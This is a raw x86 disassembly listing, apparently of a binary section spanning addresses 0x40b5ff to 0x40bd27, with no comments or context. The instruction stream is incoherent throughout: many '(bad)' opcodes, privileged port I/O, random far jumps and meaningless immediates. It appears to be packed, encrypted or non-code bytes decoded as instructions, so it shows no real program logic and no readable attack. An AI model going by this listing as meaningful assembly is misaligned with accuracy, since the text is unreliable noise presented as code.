  40b5ff:	xchg   esi,eax
  40b600:	cmp    eax,0xe75601ae
  40b605:	adc    DWORD PTR [eax],0xffffffbe
  40b608:	push   edx
  40b609:	in     eax,0xeb
  40b60b:	aas    
  40b60c:	jp     0x40b665
  40b60e:	inc    esp
  40b60f:	or     al,0xdf
  40b611:	mov    cl,0x3f
  40b613:	aas    
  40b614:	call   FWORD PTR [eax+0x4c]
  40b617:	dec    ecx
  40b618:	xor    bh,bl
  40b61a:	push   esi
  40b61b:	xchg   edx,eax
  40b61c:	xchg   ebx,eax
  40b61d:	adc    al,0xf8
  40b61f:	je     0x40b647
  40b621:	inc    edi
  40b622:	outs   dx,BYTE PTR ds:[esi]
  40b623:	gs stos BYTE PTR es:[edi],al
  40b625:	pop    ss
  40b626:	in     eax,dx
  40b627:	mov    dl,0x6f
  40b629:	ret    0xddcc
  40b62c:	scas   al,BYTE PTR es:[edi]
  40b62d:	inc    esi
  40b62e:	sti    
  40b62f:	pop    edx
  40b630:	loope  0x40b697
  40b632:	neg    BYTE PTR [esi+ebp*1-0x66520fde]
  40b639:	cmp    ah,BYTE PTR ds:0x9d0b31a2
  40b63f:	add    eax,DWORD PTR [ecx-0x26]
  40b642:	jle    0x40b611
  40b644:	lods   al,BYTE PTR ds:[esi]
  40b645:	or     BYTE PTR [edi+0x6e],bh
  40b648:	repnz int 0xb8
  40b64b:	(bad)  
  40b64c:	into   
  40b64d:	arpl   di,si
  40b64f:	nop
  40b650:	and    DWORD PTR [edi-0x3c],0x882fa0d2
  40b657:	test   al,0xc9
  40b659:	je     0x40b691
  40b65b:	push   ecx
  40b65c:	mov    ebx,0x787c6355
  40b661:	jecxz  0x40b68c
  40b663:	mov    BYTE PTR [ebx],dh
  40b665:	std    
  40b666:	ror    BYTE PTR [edx],1
  40b668:	lock mov ch,0xe4
  40b66b:	jns    0x40b689
  40b66d:	dec    ecx
  40b66e:	hlt    
  40b66f:	shl    BYTE PTR [eax],1
  40b671:	neg    BYTE PTR [ebp+0x1f]
  40b674:	adc    BYTE PTR [esi-0x47],cl
  40b677:	in     al,0x71
  40b679:	sub    eax,0x23577c06
  40b67e:	xlat   BYTE PTR ds:[ebx]
  40b67f:	nop
  40b680:	dec    ecx
  40b681:	mov    eax,0x3fe2584e
  40b686:	mov    ds:0x81705b26,al
  40b68b:	dec    edx
  40b68c:	ins    BYTE PTR es:[edi],dx
  40b68d:	xchg   ecx,eax
  40b68e:	xor    BYTE PTR [eax+0xdd573d6],0x5e
  40b695:	xor    edi,esi
  40b697:	div    edi
  40b699:	adc    al,0xb1
  40b69b:	xchg   edx,eax
  40b69c:	xchg   ebx,eax
  40b69d:	jb     0x40b627
  40b69f:	jmp    0xadb:0x5dbd3b06
  40b6a6:	pop    ecx
  40b6a7:	mov    ecx,0xacdad042
  40b6ac:	mov    eax,0x45d2f384
  40b6b1:	ins    BYTE PTR es:[edi],dx
  40b6b2:	cmp    BYTE PTR ds:0xd20fe86,ah
  40b6b8:	push   cs
  40b6b9:	loop   0x40b6cd
  40b6bb:	sbb    eax,0x9ec8ee5c
  40b6c0:	ins    DWORD PTR es:[edi],dx
  40b6c1:	xor    BYTE PTR [ecx+ebx*2+0x7d],ch
  40b6c5:	stc    
  40b6c6:	adc    ch,BYTE PTR ds:0xe05472e2
  40b6cc:	and    BYTE PTR [edi],dh
  40b6ce:	call   0x2b4f3e93
  40b6d3:	shl    BYTE PTR [edi+0x47],cl
  40b6d6:	es in  al,dx
  40b6d8:	addr16 push ecx
  40b6da:	imul   edi,DWORD PTR [ebp+eax*2-0x4b],0xffffffa7
  40b6df:	(bad)  
  40b6e0:	jno    0x40b673
  40b6e2:	xor    al,0xa2
  40b6e4:	sti    
  40b6e5:	dec    eax
  40b6e6:	(bad)  
  40b6e7:	stc    
  40b6e8:	mul    ch
  40b6ea:	out    0x8e,al
  40b6ec:	leave  
  40b6ed:	call   DWORD PTR [edi]
  40b6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6f0:	xchg   esp,eax
  40b6f1:	mov    al,0x88
  40b6f3:	push   esi
  40b6f4:	jge    0x40b713
  40b6f6:	iret   
  40b6f7:	daa    
  40b6f8:	or     DWORD PTR [ecx-0x7f5b9e0f],ebx
  40b6fe:	mov    ?,edx
  40b700:	sub    al,0x5f
  40b702:	mov    ebx,0xd3ae2e18
  40b707:	mov    cl,0xab
  40b709:	cmc    
  40b70a:	ins    BYTE PTR es:[edi],dx
  40b70b:	in     eax,0xb6
  40b70d:	or     bh,BYTE PTR [esp+eax*2]
  40b710:	sbb    al,dl
  40b712:	sbb    al,0xc4
  40b714:	clc    
  40b715:	xlat   BYTE PTR ds:[ebx]
  40b716:	stc    
  40b717:	inc    ebx
  40b718:	jo     0x40b786
  40b71a:	mov    ds:0x25d1e5ae,eax
  40b71f:	jbe    0x40b6d2
  40b721:	int    0x4b
  40b723:	stos   DWORD PTR es:[edi],eax
  40b724:	fldenv [ebp+0x4f]
  40b727:	mov    eax,ds:0xadf2ca49
  40b72c:	(bad)  
  40b72d:	sahf   
  40b72e:	and    dl,bh
  40b730:	test   eax,0xa59a745e
  40b735:	mov    ah,0x45
  40b737:	enter  0x9e14,0x4
  40b73b:	pusha  
  40b73c:	(bad)  
  40b73e:	into   
  40b73f:	xchg   edi,eax
  40b740:	inc    ebp
  40b741:	sbb    bl,BYTE PTR [esi-0x75]
  40b744:	xor    al,BYTE PTR [esi-0x7b]
  40b747:	imul   esi
  40b749:	jecxz  0x40b72d
  40b74b:	scas   al,BYTE PTR es:[edi]
  40b74c:	xchg   edi,eax
  40b74d:	int    0x1a
  40b74f:	cmp    esp,ebx
  40b751:	cli    
  40b752:	hlt    
  40b753:	test   esi,esi
  40b755:	add    ebp,ebx
  40b757:	add    eax,0x1c3cb287
  40b75c:	fmul   QWORD PTR [eax-0x284bb971]
  40b762:	or     eax,0x2166cfdf
  40b767:	or     eax,0xda247151
  40b76c:	push   ecx
  40b76d:	add    bl,cl
  40b76f:	ins    DWORD PTR es:[edi],dx
  40b770:	or     eax,0x6334a670
  40b775:	jg     0x40b725
  40b777:	imul   esi,eax,0x38
  40b77a:	ror    al,0x61
  40b77d:	xchg   esi,eax
  40b77e:	sbb    al,0x65
  40b780:	retf   0x430f
  40b783:	fisttp QWORD PTR [ecx]
  40b785:	add    BYTE PTR [edi],ch
  40b787:	aaa    
  40b788:	sbb    al,BYTE PTR [esp+edi*4-0x6f]
  40b78c:	jle    0x40b803
  40b78e:	mov    BYTE PTR [edi-0x72],ch
  40b791:	or     DWORD PTR [edi+0x51],ecx
  40b794:	idiv   DWORD PTR [ecx]
  40b796:	sbb    eax,0xd5fe1379
  40b79b:	mov    DWORD PTR [eax],ebp
  40b79d:	jb     0x40b7b0
  40b79f:	xor    al,0x94
  40b7a1:	mov    esp,0x7e042ae9
  40b7a6:	mov    eax,ds:0xc76551aa
  40b7ab:	xchg   ebp,eax
  40b7ac:	and    dl,BYTE PTR [eax-0x39]
  40b7af:	push   edi
  40b7b0:	int    0xf9
  40b7b2:	nop
  40b7b3:	mov    bh,0x5b
  40b7b5:	lock or DWORD PTR [ebx-0x1d],0x26
  40b7ba:	cld    
  40b7bb:	xlat   BYTE PTR ds:[ebx]
  40b7bc:	jnp    0x40b7bf
  40b7be:	push   ds
  40b7bf:	aas    
  40b7c0:	scas   al,BYTE PTR es:[edi]
  40b7c1:	jl     0x40b7db
  40b7c3:	and    BYTE PTR ds:[esi],ah
  40b7c6:	pop    es
  40b7c7:	test   BYTE PTR [esi+eiz*1],ch
  40b7ca:	sti    
  40b7cb:	dec    esi
  40b7cc:	pop    DWORD PTR [ecx]
  40b7ce:	xor    BYTE PTR [ecx+ebx*4],cl
  40b7d1:	xor    bh,ch
  40b7d3:	sbb    BYTE PTR [edx],bl
  40b7d5:	sub    esp,ecx
  40b7d7:	push   edi
  40b7d8:	cmp    dl,BYTE PTR [edi+0x55]
  40b7db:	pop    ebp
  40b7dc:	xchg   ebx,eax
  40b7dd:	std    
  40b7de:	or     eax,0x3ab1694
  40b7e3:	gs and ah,bl
  40b7e6:	and    eax,0x71b5ae41
  40b7eb:	add    BYTE PTR [ebx-0x5e55eaa],ch
  40b7f1:	js     0x40b816
  40b7f3:	xor    bh,BYTE PTR [esi]
  40b7f5:	xchg   ecx,eax
  40b7f6:	jmp    0x40b791
  40b7f8:	rcr    DWORD PTR [ecx-0x56a9f885],0x1d
  40b7ff:	(bad)
  40b802:	mov    ?,WORD PTR [edi]
  40b804:	inc    ecx
  40b805:	sbb    eax,0xee467ce7
  40b80a:	nop
  40b80b:	mov    dh,0xf7
  40b80d:	adc    ch,0x89
  40b810:	jge    0x40b7c7
  40b812:	std    
  40b813:	call   0x2e0d6c86
  40b818:	popa   
  40b819:	lods   al,BYTE PTR ds:[esi]
  40b81a:	jbe    0x40b895
  40b81c:	adc    eax,0xafdfbfb4
  40b821:	sub    ecx,eax
  40b823:	adc    ebx,DWORD PTR [edx-0x31017482]
  40b829:	xchg   ecx,eax
  40b82a:	ins    DWORD PTR es:[edi],dx
  40b82b:	add    DWORD PTR [esi+0x60],0xfffffff7
  40b82f:	mov    edi,0x3ae89c24
  40b834:	shl    BYTE PTR [edi],cl
  40b836:	cmp    ebp,edx
  40b838:	scas   eax,DWORD PTR es:[edi]
  40b839:	das    
  40b83a:	loopne 0x40b88f
  40b83c:	push   0x4c
  40b83e:	out    0xae,eax
  40b840:	mov    eax,ds:0x468f5a46
  40b845:	(bad)
  40b849:	xchg   ebp,eax
  40b84a:	inc    eax
  40b84b:	(bad)  
  40b84c:	push   cs
  40b84d:	push   es
  40b84e:	mov    ecx,0xe9a91e19
  40b853:	test   al,0x2b
  40b855:	pop    ebp
  40b856:	leave  
  40b857:	int    0xc2
  40b859:	sbb    eax,0x858a24af
  40b85e:	sub    al,0x45
  40b860:	ja     0x40b8e1
  40b862:	or     al,0xa8
  40b864:	in     al,dx
  40b865:	in     al,0x20
  40b867:	int3   
  40b868:	in     eax,0xe5
  40b86a:	or     al,0xc0
  40b86c:	adc    dh,BYTE PTR [ecx-0x54]
  40b86f:	lock out dx,eax
  40b871:	ins    BYTE PTR es:[edi],dx
  40b872:	imul   esp,DWORD PTR [edx+0x59f5b4e3],0xad6602ec
  40b87c:	in     al,0x14
  40b87e:	sbb    eax,0x5e47e4a3
  40b883:	ret    0x14cd
  40b886:	inc    eax
  40b887:	nop
  40b888:	sbb    DWORD PTR [edx+0x56],esi
  40b88b:	shr    BYTE PTR [esi+0x364bcdd7],0x32
  40b892:	pushf  
  40b893:	pop    edx
  40b894:	push   edx
  40b895:	imul   ebx,ebp,0xc4e2137c
  40b89b:	add    ebx,eax
  40b89d:	pushf  
  40b89e:	pop    ebx
  40b89f:	lahf   
  40b8a0:	push   0x23712f50
  40b8a5:	mov    dl,0xc9
  40b8a7:	ret    0xfd0d
  40b8aa:	pop    edi
  40b8ab:	in     al,0x20
  40b8ad:	push   ds
  40b8ae:	dec    edi
  40b8af:	inc    esi
  40b8b0:	and    esp,esp
  40b8b2:	inc    ebx
  40b8b3:	cmp    edx,DWORD PTR [esi+0x56fb8891]
  40b8b9:	adc    edi,ebx
  40b8bb:	add    edx,edx
  40b8bd:	jp     0x40b89b
  40b8bf:	pop    ebx
  40b8c0:	into   
  40b8c1:	cli    
  40b8c2:	push   cs
  40b8c3:	push   0x1f5fde6e
  40b8c8:	push   ss
  40b8c9:	ror    BYTE PTR [ecx+0x59f95088],0xe0
  40b8d0:	push   ecx
  40b8d1:	pop    es
  40b8d2:	mov    cl,0xb9
  40b8d4:	in     al,0xb
  40b8d6:	push   esi
  40b8d7:	(bad)  
  40b8d8:	aam    0xeb
  40b8da:	cmp    edx,esp
  40b8dc:	shl    DWORD PTR [eax],1
  40b8de:	or     dl,BYTE PTR [edx+edi*4-0x871f612]
  40b8e5:	ret    
  40b8e6:	repz cmp DWORD PTR [edi+0x74633a4a],edx
  40b8ed:	pop    ecx
  40b8ee:	dec    edi
  40b8ef:	add    al,0x8c
  40b8f1:	imul   edx,DWORD PTR ds:0xa98cb4a,0xaed87e4c
  40b8fb:	lds    ecx,FWORD PTR [ebp-0x7abd442c]
  40b901:	test   BYTE PTR [ebx-0x2d],cl
  40b904:	aaa    
  40b905:	push   0xa100bdc4
  40b90a:	fcomp  QWORD PTR [esi+0x2e]
  40b90d:	stc    
  40b90e:	js     0x40b8fe
  40b910:	lods   eax,DWORD PTR ds:[esi]
  40b911:	jbe    0x40b8fb
  40b913:	mov    edx,0x443cfca3
  40b918:	pop    ebp
  40b919:	lahf   
  40b91a:	adc    DWORD PTR [edi],edx
  40b91c:	pop    ebx
  40b91d:	ret    
  40b91e:	sbb    BYTE PTR [esi-0x8120a5],0x39
  40b925:	mov    BYTE PTR [edi+ebp*2-0x5e5ec3b9],ah
  40b92c:	ss pop ecx
  40b92e:	push   edi
  40b92f:	dec    eax
  40b931:	test   dl,dl
  40b933:	and    eax,0x8bef0cf3
  40b938:	mov    dh,dl
  40b93a:	cmc    
  40b93b:	adc    al,0xc6
  40b93d:	mov    ah,0xf7
  40b93f:	mov    cl,0x7d
  40b941:	adc    eax,0x1db3c035
  40b946:	call   0x822ddfb2
  40b94b:	ret    0xb39
  40b94e:	dec    ecx
  40b94f:	lods   al,BYTE PTR ds:[esi]
  40b950:	adc    al,0xda
  40b952:	cs cmp al,0xe5
  40b955:	and    esi,esi
  40b957:	adc    al,0x85
  40b959:	sbb    dl,BYTE PTR [eax]
  40b95b:	jbe    0x40b940
  40b95d:	into   
  40b95e:	and    eax,0x8392df84
  40b963:	lds    edx,FWORD PTR [eax]
  40b965:	sub    DWORD PTR [esi],0x13
  40b968:	rcr    DWORD PTR [ecx],0xcc
  40b96b:	pop    edx
  40b96c:	jo     0x40b98f
  40b96e:	add    eax,0x75684ff
  40b973:	gs jmp 0xcd4bf229
  40b979:	pop    ss
  40b97a:	fldcw  WORD PTR [eax]
  40b97c:	hlt    
  40b97d:	ret    
  40b97e:	sub    BYTE PTR cs:[eax],bl
  40b981:	gs lock mov ecx,0xb01578fe
  40b988:	push   ebx
  40b989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b98a:	xchg   ebp,eax
  40b98b:	in     eax,dx
  40b98c:	inc    esi
  40b98d:	or     eax,0x5d1d181e
  40b992:	leave  
  40b993:	xor    BYTE PTR [edx+ecx*2-0x57bf8877],ch
  40b99a:	sub    DWORD PTR [ebx],eax
  40b99c:	jo     0x40b9b5
  40b99e:	xor    DWORD PTR [esi-0x6f],eax
  40b9a1:	mov    BYTE PTR [edx],bh
  40b9a3:	ror    DWORD PTR [esi-0x62],cl
  40b9a6:	xchg   edx,eax
  40b9a7:	xor    al,BYTE PTR [ebp+0x24]
  40b9aa:	loop   0x40b9a7
  40b9ac:	in     al,dx
  40b9ad:	sbb    ebp,DWORD PTR [esi]
  40b9af:	mov    ch,0x83
  40b9b1:	dec    esi
  40b9b2:	icebp  
  40b9b3:	add    edi,DWORD PTR [ebx-0x4b]
  40b9b6:	stos   DWORD PTR es:[edi],eax
  40b9b7:	xor    eax,0x8bfb2b3a
  40b9bc:	mov    WORD PTR [ecx+0x1ea6b132],?
  40b9c2:	aam    0xb4
  40b9c4:	push   esp
  40b9c5:	imul   bl
  40b9c7:	xchg   edi,eax
  40b9c8:	out    dx,al
  40b9c9:	stos   DWORD PTR es:[edi],eax
  40b9ca:	jmp    0x9613:0x993e7bc
  40b9d1:	lods   al,BYTE PTR ds:[esi]
  40b9d2:	les    ecx,FWORD PTR [edi]
  40b9d4:	fistp  DWORD PTR [edx+0x4e]
  40b9d7:	std    
  40b9d8:	(bad)  
  40b9d9:	mov    ?,ebp
  40b9db:	push   ecx
  40b9dc:	in     al,dx
  40b9dd:	pop    ecx
  40b9de:	call   0x2eba:0xfff3fafe
  40b9e5:	cmp    ebx,edi
  40b9e7:	xor    esi,esp
  40b9e9:	dec    esp
  40b9ea:	(bad)  [edi-0x22f30f5b]
  40b9f0:	loopne 0x40b9c4
  40b9f2:	iret   
  40b9f3:	out    dx,eax
  40b9f4:	inc    esp
  40b9f5:	mov    ah,0x64
  40b9f7:	leave  
  40b9f8:	rcl    DWORD PTR [esi+0x9],0x3f
  40b9fc:	inc    eax
  40b9fd:	xor    esi,DWORD PTR [eax-0x7]
  40ba00:	outs   dx,BYTE PTR ds:[esi]
  40ba01:	add    DWORD PTR [eax+eiz*1-0x72],0x6f
  40ba06:	in     eax,dx
  40ba07:	mov    eax,ds:0x92ea8ade
  40ba0c:	fcmovu st,st(7)
  40ba0e:	fcomp  QWORD PTR [edi]
  40ba10:	push   esp
  40ba11:	mov    esp,0x7d2c5a0c
  40ba16:	vcvtsi2ss xmm6{k3}{z},xmm4,DWORD PTR [edx-0xd0]
  40ba1d:	inc    ecx
  40ba1e:	sub    al,0xa7
  40ba21:	add    BYTE PTR [ebp+0x9390506],0xdf
  40ba28:	jmp    0x40b9bb
  40ba2a:	and    al,0xbf
  40ba2c:	icebp  
  40ba2d:	in     eax,0xde
  40ba2f:	mov    ds:0x94c847ac,al
  40ba34:	add    esi,ebx
  40ba36:	push   ebx
  40ba37:	inc    esp
  40ba38:	in     al,0xc8
  40ba3a:	adc    eax,0xd77c5d40
  40ba3f:	rol    DWORD PTR [edx+0x15],0xd4
  40ba43:	pop    esi
  40ba44:	cdq    
  40ba45:	mov    eax,ds:0x898fe2cf
  40ba4a:	shl    DWORD PTR [edi+0x53],1
  40ba4d:	dec    esi
  40ba4e:	dec    edi
  40ba4f:	dec    edx
  40ba50:	dec    ebp
  40ba51:	mov    BYTE PTR [esi-0x29],dl
  40ba54:	mov    ah,0x85
  40ba56:	cld    
  40ba57:	imul   esi,DWORD PTR [esi],0x4b1fa21d
  40ba5d:	mov    dl,0xe9
  40ba5f:	pop    ebx
  40ba60:	sbb    edi,DWORD PTR [esi+ecx*2+0x6e]
  40ba64:	stos   BYTE PTR es:[edi],al
  40ba65:	jge    0x40ba12
  40ba67:	sub    al,0x65
  40ba69:	repnz push edi
  40ba6b:	sbb    al,BYTE PTR [ebp+0x9901dca]
  40ba71:	dec    edx
  40ba72:	ret    
  40ba73:	icebp  
  40ba74:	jecxz  0x40b9f7
  40ba76:	lds    ebx,FWORD PTR [ebx+0x525ef619]
  40ba7c:	cwde   
  40ba7d:	dec    esi
  40ba7e:	xlat   BYTE PTR ds:[ebx]
  40ba7f:	mov    ds:0x47d6bc02,al
  40ba84:	rcr    DWORD PTR [edi],cl
  40ba86:	jno    0x40ba97
  40ba88:	push   cs
  40ba89:	xor    bh,BYTE PTR [edi]
  40ba8b:	aas    
  40ba8c:	mov    eax,0xf34b660d
  40ba91:	je     0x40ba80
  40ba93:	mov    ebp,?
  40ba95:	dec    ebp
  40ba96:	hlt    
  40ba97:	pushf  
  40ba98:	dec    esi
  40ba99:	aaa    
  40ba9a:	fild   DWORD PTR [ebx+0x3bef01d0]
  40baa0:	lahf   
  40baa1:	fsubr  DWORD PTR [ebp+ecx*1+0x67250e0e]
  40baa8:	ja     0x40bac3
  40baaa:	pop    ds
  40baab:	lods   eax,DWORD PTR ds:[esi]
  40baac:	fcom   QWORD PTR [eax+0xc7d75c7]
  40bab2:	xor    BYTE PTR [ecx+ebp*1+0x5259efda],ch
  40bab9:	int3   
  40baba:	cmp    bl,0x88
  40babd:	pop    edx
  40babe:	sub    al,0x98
  40bac0:	fs xchg ebp,eax
  40bac2:	push   esi
  40bac3:	inc    ecx
  40bac4:	pop    esi
  40bac5:	aas    
  40bac6:	cmp    ecx,ecx
  40bac8:	sub    al,0xe6
  40baca:	bnd jle 0x40badd
  40bacd:	lock out dx,eax
  40bacf:	call   0x3bd0:0xfd3d5c87
  40bad6:	push   ecx
  40bad7:	dec    edx
  40bad8:	xor    DWORD PTR [edi+0x2753bfbe],eax
  40bade:	sbb    dh,BYTE PTR [esi+0x4b]
  40bae1:	sbb    eax,0xa7bf5de7
  40bae6:	ss aaa 
  40bae8:	fadd   st(1),st
  40baea:	loopne 0x40bb35
  40baec:	in     eax,0xe5
  40baee:	test   eax,0x8cde4b9a
  40baf3:	dec    DWORD PTR [ebp-0x55]
  40baf6:	data16 xor cl,0xd
  40bafa:	xchg   edi,eax
  40bafb:	js     0x40bb19
  40bafd:	add    DWORD PTR [ebx],edx
  40baff:	push   cs
  40bb00:	rcr    BYTE PTR [edi+eax*4+0x5df84cbf],1
  40bb07:	bound  ecx,QWORD PTR [ebx+0x7d]
  40bb0a:	aaa    
  40bb0b:	pop    eax
  40bb0c:	push   edi
  40bb0d:	mov    ds:0x7f9f9420,al
  40bb12:	pop    edi
  40bb13:	sub    al,0x42
  40bb15:	(bad)  
  40bb16:	(bad)  
  40bb17:	push   eax
  40bb18:	out    0x17,al
  40bb1a:	ins    BYTE PTR es:[edi],dx
  40bb1b:	ins    DWORD PTR es:[edi],dx
  40bb1c:	pop    ds
  40bb1d:	dec    esp
  40bb1e:	sub    BYTE PTR [eax],0xce
  40bb21:	pop    edi
  40bb22:	loop   0x40bac0
  40bb24:	pushf  
  40bb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb26:	or     al,0x77
  40bb28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb29:	stos   BYTE PTR es:[edi],al
  40bb2a:	ss enter 0x89b9,0xd
  40bb2f:	ret    0x4476
  40bb32:	xor    al,0x3c
  40bb34:	stos   DWORD PTR es:[edi],eax
  40bb35:	je     0x40bb0b
  40bb37:	jmp    0x8777:0x1b0f2a77
  40bb3e:	lds    edi,FWORD PTR [esi+0x65]
  40bb41:	jae    0x40bb41
  40bb43:	outs   dx,DWORD PTR ds:[esi]
  40bb44:	sub    eax,0xff27c322
  40bb49:	test   al,0x6f
  40bb4b:	mov    ch,0x93
  40bb4d:	jmp    0x8b81:0x4f5d2737
  40bb54:	ins    BYTE PTR es:[edi],dx
  40bb55:	mov    esp,DWORD PTR [esi-0x42]
  40bb58:	iret   
  40bb59:	(bad)  
  40bb5a:	mov    ds:0xb42afc96,eax
  40bb5f:	into   
  40bb60:	sbb    eax,0x5a788ca5
  40bb65:	cmp    al,0xcd
  40bb67:	inc    ebp
  40bb68:	cli    
  40bb69:	jmp    0x6733:0x9074085f
  40bb70:	popa   
  40bb71:	sbb    eax,0x901b9c07
  40bb76:	fnstcw WORD PTR [ebx-0x616e3da7]
  40bb7c:	jo     0x40bbed
  40bb7e:	pushf  
  40bb7f:	pop    ebp
  40bb80:	(bad)  
  40bb81:	cmc    
  40bb82:	enter  0x726d,0x19
  40bb86:	push   esp
  40bb87:	jno    0x40bb3c
  40bb89:	xchg   ebx,eax
  40bb8a:	pop    ebx
  40bb8b:	ins    DWORD PTR es:[edi],dx
  40bb8c:	nop    DWORD PTR [ebx]
  40bb8f:	xor    eax,DWORD PTR [ebx+0x63]
  40bb92:	enter  0x1bfc,0xa8
  40bb96:	aam    0xab
  40bb98:	stc    
  40bb99:	aas    
  40bb9a:	xchg   esi,eax
  40bb9b:	add    bl,BYTE PTR [eax+0x12]
  40bb9e:	push   ebp
  40bb9f:	jmp    0x5b6a:0x3fcdfdc6
  40bba6:	adc    BYTE PTR [eax+0x5cacc3d4],ch
  40bbac:	add    BYTE PTR [edx],ah
  40bbae:	stos   BYTE PTR es:[edi],al
  40bbaf:	scas   eax,DWORD PTR es:[edi]
  40bbb0:	mov    ecx,0xadceda3c
  40bbb5:	push   es
  40bbb6:	mov    edi,0xe226b48f
  40bbbb:	push   ecx
  40bbbc:	lock imul ebp,DWORD PTR [edi+0x26],0xffffff9a
  40bbc1:	and    bl,dh
  40bbc3:	in     al,dx
  40bbc4:	push   cs
  40bbc5:	add    edx,DWORD PTR [ecx-0x112bf04a]
  40bbcb:	retf   
  40bbcc:	fdiv   QWORD PTR [eax+0x69926b1d]
  40bbd2:	(bad)  
  40bbd3:	adc    cl,BYTE PTR [edi+0x7b3e9c34]
  40bbd9:	add    BYTE PTR [esi],0x34
  40bbdc:	inc    edx
  40bbdd:	and    al,0x3a
  40bbdf:	or     edi,DWORD PTR [ecx+0x6a]
  40bbe2:	pop    es
  40bbe3:	out    dx,al
  40bbe4:	pop    ss
  40bbe5:	or     al,0x87
  40bbe7:	adc    al,dl
  40bbe9:	pop    eax
  40bbea:	xchg   edx,eax
  40bbeb:	push   edi
  40bbec:	push   ebx
  40bbed:	push   ebx
  40bbee:	xchg   ah,cl
  40bbf0:	int3   
  40bbf1:	pop    esp
  40bbf2:	xor    esp,esi
  40bbf4:	sbb    eax,0x4d3f2b08
  40bbf9:	adc    ch,BYTE PTR [edi-0x4c]
  40bbfc:	(bad)  
  40bbfd:	mov    ebx,0x75888c39
  40bc02:	and    eax,DWORD PTR [ebp+ebp*8+0x34]
  40bc06:	out    0x42,al
  40bc08:	pop    ebx
  40bc09:	inc    edi
  40bc0a:	dec    ebp
  40bc0b:	cli    
  40bc0c:	out    dx,al
  40bc0d:	ret    0xc0cc
  40bc10:	jg     0x40bc12
  40bc12:	xchg   ecx,eax
  40bc13:	xor    al,0x16
  40bc15:	cld    
  40bc16:	ins    BYTE PTR es:[edi],dx
  40bc17:	adc    al,0x24
  40bc19:	push   0x36ea13a4
  40bc1e:	(bad)
  40bc21:	in     al,dx
  40bc22:	cmp    esp,ecx
  40bc24:	jl     0x40bc37
  40bc26:	push   ebp
  40bc27:	mov    ecx,0xe2365a16
  40bc2c:	cwde   
  40bc2d:	ds pop ds
  40bc2f:	(bad)  
  40bc30:	out    0x30,eax
  40bc32:	shl    ch,0xd4
  40bc35:	add    BYTE PTR [ebp+ecx*1-0x8],dl
  40bc39:	mov    BYTE PTR [ecx-0x5b],al
  40bc3c:	xor    dl,0xc5
  40bc3f:	clc    
  40bc40:	loop   0x40bbdc
  40bc42:	outs   dx,BYTE PTR ds:[esi]
  40bc43:	rcl    BYTE PTR [edx+0x4755a765],cl
  40bc49:	mov    WORD PTR [ebx+0x45],ds
  40bc4c:	aam    0xa1
  40bc4e:	retf   
  40bc4f:	imul   eax,DWORD PTR [ebx+0x1125bac4],0xd7c0aac1
  40bc59:	in     eax,dx
  40bc5a:	inc    ax
  40bc5c:	test   bl,0x8f
  40bc5f:	xchg   BYTE PTR [edx-0x5331bab8],cl
  40bc65:	lock inc esp
  40bc67:	lahf   
  40bc68:	cld    
  40bc69:	pop    ss
  40bc6a:	inc    ebp
  40bc6b:	sub    al,al
  40bc6d:	dec    edi
  40bc6e:	in     al,0x30
  40bc70:	xor    eax,DWORD PTR [edi+ecx*2]
  40bc73:	jno    0x40bc68
  40bc75:	stos   DWORD PTR es:[edi],eax
  40bc76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc77:	jns    0x40bca6
  40bc79:	mov    edx,0x9cbc8ba5
  40bc7e:	cmp    edi,eax
  40bc80:	jb     0x40bca5
  40bc82:	aas    
  40bc83:	fs push edx
  40bc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc86:	jne    0x40bc31
  40bc88:	std    
  40bc89:	dec    esp
  40bc8a:	mov    cl,0x63
  40bc8c:	pop    esp
  40bc8d:	fsubr  DWORD PTR [edx+ebp*4]
  40bc90:	loop   0x40bd03
  40bc92:	jl     0x40bc50
  40bc94:	jae    0x40bcac
  40bc96:	(bad)  
  40bc97:	out    dx,al
  40bc98:	stc    
  40bc99:	cld    
  40bc9a:	imul   esi,DWORD PTR [ecx-0x62d09918],0x79809c03
  40bca4:	mov    ds:0xfaffc57a,eax
  40bca9:	rcl    edx,0xbe
  40bcac:	or     al,0x64
  40bcae:	scas   al,BYTE PTR es:[edi]
  40bcaf:	and    BYTE PTR [ecx],dh
  40bcb1:	popf   
  40bcb2:	mov    ah,0x44
  40bcb4:	scas   al,BYTE PTR es:[edi]
  40bcb5:	inc    edx
  40bcb6:	xor    eax,edx
  40bcb8:	dec    ebx
  40bcb9:	lods   al,BYTE PTR ds:[esi]
  40bcba:	call   0x6c03f300
  40bcbf:	and    ebp,ecx
  40bcc1:	sub    al,0x42
  40bcc3:	ds ins DWORD PTR es:[edi],dx
  40bcc5:	push   eax
  40bcc6:	sti    
  40bcc7:	pop    eax
  40bcc8:	fstp   TBYTE PTR [ebx]
  40bcca:	(bad)  
  40bccb:	fidivr WORD PTR [esi*1+0x6badea1c]
  40bcd2:	mov    al,ds:0xbf39705a
  40bcd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcd8:	cmp    BYTE PTR [ebp-0x4101f4a1],dh
  40bcde:	mov    bh,0x3a
  40bce0:	mov    dl,0xc4
  40bce2:	xlat   BYTE PTR ds:[ebx]
  40bce3:	(bad)  
  40bce4:	rcr    DWORD PTR ds:0xf57b0d41,1
  40bcea:	das    
  40bceb:	out    dx,al
  40bcec:	mov    bl,0x95
  40bcee:	les    ebp,FWORD PTR [eax+edi*1-0x5a]
  40bcf2:	jno    0x40bce3
  40bcf4:	adc    ebp,DWORD PTR [ecx+0x6da86c54]
  40bcfa:	ret    0xd164
  40bcfd:	repnz mov eax,0xa6e686e0
  40bd03:	scas   al,BYTE PTR es:[edi]
  40bd04:	shl    BYTE PTR [ebx+0x5f],cl
  40bd07:	fs push cs
  40bd09:	adc    DWORD PTR [edi-0x1c],ebx
  40bd0c:	sbb    ch,BYTE PTR [edi-0x17]
  40bd0f:	pop    ebx
  40bd10:	fwait
  40bd11:	cmp    eax,0xf0843039
  40bd16:	cmp    esi,edx
  40bd18:	shr    BYTE PTR [edi-0x1e959a93],0xfa
  40bd1f:	std    
  40bd20:	pop    edx
  40bd21:	xlat   BYTE PTR ds:[ebx]
  40bd22:	xor    ebx,DWORD PTR [esi-0x3a]
  40bd25:	jno    0x40bd55
  40bd27:	sub    al,BYTE PTR [ecx-0x1f144729]
